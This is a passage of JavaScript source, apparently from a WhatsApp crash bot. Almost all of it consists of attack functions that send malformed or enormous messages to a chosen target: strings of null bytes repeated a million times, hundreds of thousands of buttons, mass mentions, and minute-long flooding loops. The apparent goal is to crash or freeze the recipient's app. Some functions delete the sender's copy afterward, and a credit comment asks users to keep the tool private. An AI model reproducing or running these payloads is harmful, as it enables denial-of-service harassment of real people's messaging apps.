   }
}


async function XNull(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "Hay Bro, You Know Fantzy?",
      },
      nativeFlowMessage: {
        buttons: "ી".repeat(500000)
      }
    }
  };
  
  await sock.relayMessage(target, msg);
}

async function crashX(sock, target) {
await sock.relayMessage(target, {
senderKeyDistributionMessage: {
groupId: "120363428445623974@g.us",
axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
},
interactiveMessage: {
body: {
text: "x"
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}"
}
],
messageParamsJson: "{}"
}
}
},
{
additionalNodes: [
{
tag: "biz",
attrs: {
native_flow_name: "catalog_message"
}
}
]
});
}


async function ZetTempurGb(sock, target) {
const CrBLay = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Maklo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
 const Crb1 = generateWAMessageFromContent(target, CrBLay, {});

await sock.relayMessage(target, Crb1.message, {
messageId: Crb1.key.id
})

await sleep(200);

const CrBDoj = {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Crb2 = generateWAMessageFromContent(target, CrBDoj, {});

await sock.relayMessage(target, Crb2.message, {
messageId: Crb2.key.id
})

await sleep(200);

const CrBLol = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              },
            },
          },
        },
      },
    },
  };

const Crb3 = generateWAMessageFromContent(target, CrBLol, {});

await sock.relayMessage(target, Crb3.message, {
messageId: Crb3.key.id
})
}

async function ZetTempur(sock, target) {
const CrBLay = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Maklo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
 const Crb1 = generateWAMessageFromContent(target, CrBLay, {});

await sock.relayMessage(target, Crb1.message, {
messageId: Crb1.key.id
})

await sleep(200);

const CrBDoj = {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Crb2 = generateWAMessageFromContent(target, CrBDoj, {});

await sock.relayMessage(target, Crb2.message, {
messageId: Crb2.key.id
})

await sleep(200);

const CrBLol = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              },
            },
          },
        },
      },
    },
  };

const Crb3 = generateWAMessageFromContent(target, CrBLol, {});

await sock.relayMessage(target, Crb3.message, {
messageId: Crb3.key.id
})
}

async function PorkLosTempi(sock, target) {
  const CrBHitS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "MakLo¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const CrBMsG = generateWAMessageFromContent(target, CrBHitS, {});

await sock.relayMessage(target, CrBMsG.message, {
  messageId: CrBMsG.key.id
})

await sleep(1000);

const CrBLock = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const CrbLeg = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, CrbLeg.message, {
messageId: CrbLeg.key.id
})
}
async function convQtdUI(sock, target) {
  for (let i = 0; i < 1; i++) {
    await sleep(1500);
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "Hay, Salken Fantzy" + "ꦽ".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                mentionedJid: [target],
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}
async function TempekOneHit(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const CrBMakLo = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: "\u0000".repeat(999),
          name: "Nando Officiall",
          publisher: "\u0000".repeat(999),
          fileLength: 9999,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
          },
        },
      },
    },
  };

  const CrB = generateWAMessageFromContent(target, CrBMakLo, {});

await sock.relayMessage(target, CrB.message, {
  messageId: CrB.key.id
})
}
}

async function CrashHome(sock, target) {
const CrBLock = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const Crb = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

async function FrezeXblank(sock, target) {
  const Vdx = await prepareWAMessageMedia({
    video: {
      url: "https://files.catbox.moe/74v4yo.mp4", 
      gifPlayback: true
    }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  
  for (let i = 0; i < 25; i++) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: ".",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...Vdx,
          hasMediaAttachment: true
        },
        body: { 
         text: "𖣂༑⌁⃰𝐊𝐀𝐌𝐔 𝐊𝐄𝐍𝐀𝐋 𝐅𝐀𝐍𝐓𝐙𝐘 𝐆𝐀? 😹"
        },
        nativeFlowMessage: {
          buttons: [{
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(25000)}","sections":[{"title":"Crash","rows":[]}]}`
            }, {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: target })

    await sock.relayMessage(target, msg.message, { 
       messageId: msg.key.id
     })
   }
 }
async function invZQL(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                  fileLength: "999",
                  caption: "-#VaultSuperior",
                  height: 1080,
                  width: 1080,
                  mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                  fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                  directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1778142659",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
                  contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true,
                    remoteJid: "-𝗩𝗮𝘂𝗹𝘁𝗦𝘂𝗽𝗲𝗿𝗶𝗼𝗿 #𝕍𝕤ℙ"
                  },
                  scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                  scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                  ],
                  midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
                },
                title: "X",
                hasMediaAttachment: true
              },
              body: {
                text: "X",
              },
              nativeFlowMessage: {
                buttons: "\0".repeat(500000)
              }
            }
          }
        }
      },
      {
        participant: {
          jid: target
        }
      }
    )
  }
}
async function convQntd(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
   target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                  fileLength: "999",
                  caption: "-#VaultSuperior",
                  height: 1080,
                  width: 1080,
                  mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                  fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                  directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1778142659",
                  jpegThumbnail: "",
                  contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true,
                    remoteJid: "-𝗩𝗮𝘂𝗹𝘁𝗦𝘂𝗽𝗲𝗿𝗶𝗼𝗿 #𝕍𝕤ℙ"
                  },
                  scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                  scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                  ],
                  midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
                },
                title: "X",
                hasMediaAttachment: true
              },
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\0".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: "vault!nspect",
                  body: "superior3xplanation",
                  thumbnailUrl: "https://files.catbox.moe/ur8m20.jpg",
                  sourceUrl: "https://vsp-killer.gov/",
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target }
    });

    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}
async function convQtd(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}
async function pelerlukering(sock, target) {
  const btn = { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: '\0'.repeat(5000) }) };
  const buttons = Array.from({ length: 30000 }, () => btn);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: '\0'.repeat(200000), format: 'DEFAULT' },
          footer: { text: '\0'.repeat(50000), format: 'DEFAULT' },
          nativeFlowMessage: { buttons }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function marno1555(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\x10" },
          nativeFlowMessage: {
            buttons: "៝".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function marno(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\x10" },
          nativeFlowMessage: {
            buttons: "ꦽ".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });

  const bokepnew = "ꦽ".repeat(80000);
  const inpis = "\u0000".repeat(1200000);
  const rudalbalistik = Array.from({ length: 5000 }, (_, i) => `${i}@s.whatsapp.net`);
  
  const pepekitem = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: bokepnew,
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: inpis,
            version: 3
          },
          contextInfo: {
            mentionedJid: [target, "0@s.whatsapp.net", ...rudalbalistik],
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          }
        }
      }
    }
  };

  const pepekputih = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\x10".repeat(50000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: JSON.stringify({
              state: "ꦽ".repeat(900000),
              city: bokepnew.substring(0, 2000)
            }),
            version: 3
          },
          contextInfo: {
            mentionedJid: [target, "01010101010@s.whatsapp.net", ...rudalbalistik.slice(0, 1000)],
            remoteJid: "status@broadcast",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 99999
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, pepekitem, { messageId: null });
  await sock.relayMessage(target, pepekputih, { messageId: null });
}

/*
Credit By : @Nando Officiall 
    
(𖥊) NOTE : 
 -JANGAN SHERE PT
 -JANGAN LU JUAL YGY
 -JANGAN SHERE PUBLIK
 -INTI NYA BUAT LU PRIBADI
 -ERROR? LAPOR KE NANDO
 
≛ MELANGGAR? GW BL + MAK NYA AMPAS ≛
*/


async function NgacengBre1(target) {
    let NanMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg.message, {
        messageId: NanMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    console.log(chalk.red(`Succes Sending Bug Delay To ${target}`));
}

async function NgacengBre2(sock, target) {
    var NanMsg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg1.message, {
        messageId: NanMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg2.message, {
        messageId: NanMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg3 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg3.message, {
        messageId: NanMsg3.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg4 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg4.message, {
        messageId: NanMsg4.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    var NanMsg5 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg5.message, {
        messageId: NanMsg5.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg6 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg6.message, {
        messageId: NanMsg6.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg7 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg7.message, {
        messageId: NanMsg7.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg8 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg8.message, {
        messageId: NanMsg8.key.id,
